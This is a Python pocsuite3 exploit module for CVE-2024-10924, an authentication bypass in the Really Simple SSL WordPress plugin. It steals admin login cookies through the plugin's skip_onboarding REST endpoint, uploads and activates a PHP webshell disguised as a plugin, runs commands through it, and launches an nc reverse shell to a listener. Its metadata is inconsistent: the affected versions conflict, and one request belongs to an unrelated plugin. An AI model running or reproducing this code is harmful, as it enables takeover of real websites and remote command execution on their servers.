import requests
import time
import json
import io
import zipfile
from urllib.parse import urljoin, unquote, quote
import urllib
from bs4 import BeautifulSoup
import re
from pocsuite3.api import POCBase, Output, register_poc, OptString, OrderedDict, REVERSE_PAYLOAD, get_listener_ip, get_listener_port
from pocsuite3.lib.core.enums import VUL_TYPE, POC_CATEGORY

class ReallySimpleSSL2FABypassPOC(POCBase):
    vulID = 'CVE-2024-10924'
    version = '1.0'
    author = ['YourName']
    vulDate = '2024-04-12'
    createDate = '2024-10-25'
    updateDate = '2024-10-25'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10924']
    name = 'Really Simple SSL 2FA Bypass Vulnerability CVE-2024-10924'
    appPowerLink = 'https://really-simple-ssl.com/'
    appName = 'Really Simple SSL'
    appVersion = '9.0.0 - 9.1.1.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS
    desc = '''
        The Really Simple SSL plugin for WordPress (versions <= 7.2.0) has a vulnerability in its 2FA onboarding process.
        The REST API endpoint /reallysimplessl/v1/two_fa/skip_onboarding allows an attacker to bypass 2FA by sending a crafted
        POST request with a user_id, leading to unauthorized access to the admin panel via authentication cookies.
    '''
    samples = []

    def __init__(self):
        super().__init__()
        self.admin_cookies = None  

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('whoami', description='Command to execute via webshell', require=False)
        return o

    def _verify(self):
        result = {}
        target_url = self.url.rstrip('/') + "/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
        user_id = 1

        data = {
            "user_id": user_id,
            "login_nonce": "invalid_nonce",
            "redirect_to": "/wp-admin/"
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": self.url,
            "Referer": f"{self.url}/wp-login.php"
        }

        try:
            response = requests.post(target_url, json=data, headers=headers, timeout=10)
            if response.status_code == 200:
                cookies = response.cookies.get_dict()
                if cookies and any("wordpress_logged_in" in name for name in cookies.keys()):
                    self.admin_cookies = cookies  
                    result['VerifyInfo'] = {
                        'URL': target_url,
                        'Cookies': cookies
                    }
                else:
                    result['Error'] = "No valid WordPress login cookies received"
            else:
                result['Error'] = f"Unexpected response code: {response.status_code}"
        except requests.exceptions.RequestException as e:
            result['Error'] = f"Verification failed: {str(e)}"

        return self.parse_output(result)

    def _attack(self):
        result = {}
        if not hasattr(self, 'admin_cookies') or not self.admin_cookies:
            verify_result = self._verify()
            if not verify_result.is_success():
                result['Error'] = "Failed to obtain authentication cookies"
                return self.parse_output(result)

        base_url = self.url.rstrip('/')
        admin_url = f"{base_url}/wp-admin/"
        upload_url = f"{base_url}/wp-admin/update.php?action=upload-plugin"
        session = requests.Session()
        plugin_dir = "myplugin"
        webshell_url = f"{base_url}/wp-content/plugins/{plugin_dir}/myplugin.php"

        try:
            session.cookies.update(self.admin_cookies)
        except Exception as e:
            result['Error'] = f"Failed to use cookies: {str(e)}"
            return self.parse_output(result)

        admin_page = session.get(admin_url, allow_redirects=True, verify=False)
        admin_soup = BeautifulSoup(admin_page.content, 'html.parser')
        if not (admin_soup.find('title') and 'Dashboard' in admin_soup.find('title').text):
            result['Error'] = "Failed to access admin dashboard"
            return self.parse_output(result)
        # Check plugin 
        try:
            plugin_check = session.get(webshell_url, verify=False, timeout=10)
            if plugin_check.status_code == 200:
                cmd = self.get_option('cmd') or 'whoami'
                rce_url = f"{webshell_url}?cmd={quote(cmd)}"
                try:
                    rce_response = session.get(rce_url, verify=False, timeout=10)
                    rce_response.raise_for_status()
                    if rce_response.text.strip():
                        result['Success'] = {
                            'URL': rce_url,
                            'Command': cmd,
                            'Output': rce_response.text.strip()
                        }
                    return self.parse_output(result)
                except requests.exceptions.RequestException:
                    return self.parse_output(result)
        except requests.exceptions.RequestException:
            pass  

        # Webshell payload
        webshell_payload = """<?php
            if(isset($_GET['cmd'])) {
                system($_GET['cmd'] . ' 2>&1');
            }
            ?>"""

        # Create ZIP file
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr(f"{plugin_dir}/myplugin.php", webshell_payload)
        zip_buffer.seek(0)

        # Fetch upload nonce
        try:
            upload_page = session.get(f"{base_url}/wp-admin/plugin-install.php?tab=upload", verify=False, timeout=15)
            upload_page.raise_for_status()
            upload_soup = BeautifulSoup(upload_page.content, 'html.parser')
            nonce_input = upload_soup.find('input', {'name': '_wpnonce'})
            if not nonce_input or 'value' not in nonce_input.attrs:
                result['Error'] = "Failed to retrieve upload nonce"
                return self.parse_output(result)
            upload_nonce = nonce_input['value']
        except requests.exceptions.RequestException as e:
            result['Error'] = f"Failed to fetch upload page: {str(e)}"
            return self.parse_output(result)

        # Upload plugin
        files = {
            'pluginzip': ("My Plugin.zip", zip_buffer, 'application/zip'),
            'install-plugin-submit': (None, 'Install Now')
        }
        upload_data = {
            '_wpnonce': upload_nonce,
            '_wp_http_referer': f"{base_url}/wp-admin/plugin-install.php?tab=upload",
            'install-plugin-submit': 'Install Now'
        }
        try:
            upload_response = session.post(upload_url, files=files, data=upload_data, verify=False, timeout=20)
            upload_response.raise_for_status()
            if 'Plugin installed successfully' in upload_response.text or 'The plugin has been installed' in upload_response.text:
                plugin_file_url = f"{base_url}/wp-content/plugins/{plugin_dir}/myplugin.php"
                file_check = session.get(plugin_file_url, verify=False, timeout=10)
                if file_check.status_code != 200:
                    result['Error'] = "Uploaded plugin file not accessible"
                    return self.parse_output(result)
            else:
                result['Error'] = "Plugin installation failed"
                return self.parse_output(result)
        except requests.exceptions.RequestException as e:
            result['Error'] = f"Plugin upload failed: {str(e)}"
            return self.parse_output(result)

        # Activate plugin
        plugins_page = session.get(f"{base_url}/wp-admin/plugins.php", verify=False)
        plugins_page_soup = BeautifulSoup(plugins_page.content, 'html.parser')
        activation_link = plugins_page_soup.find('a', {'href': True, 'aria-label': lambda x: x and 'Activate My Plugin' in x})
        if activation_link:
            activation_href = activation_link['href']
            nonce_value = activation_href.split('_wpnonce=')[1].split('&')[0]
            activation_url = f"{base_url}/wp-admin/plugins.php?action=activate&plugin=myplugin%2Fmyplugin.php&_wpnonce={nonce_value}"
            activation_response = session.get(activation_url, verify=False)
            if "Plugin activated" not in activation_response.text:
                result['Error'] = "Plugin activation failed"
                return self.parse_output(result)
        else:
            result['Error'] = "Plugin activation link not found"
            return self.parse_output(result)

        # Create default pages
        create_pages_url = f"{base_url}/wp-admin/plugins.php?activate=true&plugin_status=all&paged=1&s&um_adm_action=install_core_pages"
        session.get(create_pages_url, allow_redirects=False, verify=False)

        cmd = self.get_option('cmd') or 'whoami'
        try:
            rce_url = f"{webshell_url}?cmd={quote(cmd)}"
            rce_response = session.get(rce_url, verify=False, timeout=10)
            rce_response.raise_for_status()
            if rce_response.text.strip():
                result['Success'] = {
                    'URL': rce_url,
                    'Command': cmd,
                    'Output': rce_response.text.strip()
                }
        except requests.exceptions.RequestException as e:
            return self.parse_output(result)
        return self.parse_output(result)

    def _shell(self):
        result = {}
        if not hasattr(self, 'admin_cookies') or not self.admin_cookies:
            verify_result = self._verify()
            if not verify_result.is_success():
                result['Error'] = "Failed to obtain authentication cookies"
                return self.parse_output(result)

        base_url = self.url.rstrip('/')
        plugin_dir = "myplugin"
        webshell_url = f"{base_url}/wp-content/plugins/{plugin_dir}/myplugin.php"
        session = requests.Session()

        try:
            session.cookies.update(self.admin_cookies)
        except Exception as e:
            result['Error'] = f"Failed to use cookies: {str(e)}"
            return self.parse_output(result)

        cmd = REVERSE_PAYLOAD.NC.format(get_listener_ip(), get_listener_port())
        encoded_payload = urllib.parse.quote(cmd)
        try:
            rce_url = f"{webshell_url}?cmd={encoded_payload}"
            response = session.get(rce_url, verify=False, timeout=20)
            response.raise_for_status()
            result['ShellInfo'] = {
                'Web_Shell_URL': rce_url,
                'Status': 'Reverse shell executed successfully',
                'Listener': f"{get_listener_ip()}:{get_listener_port()}"
            }
        except requests.exceptions.RequestException as e:
            result['Error'] = f"Reverse shell execution failed: {str(e)}"
        
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(ReallySimpleSSL2FABypassPOC)
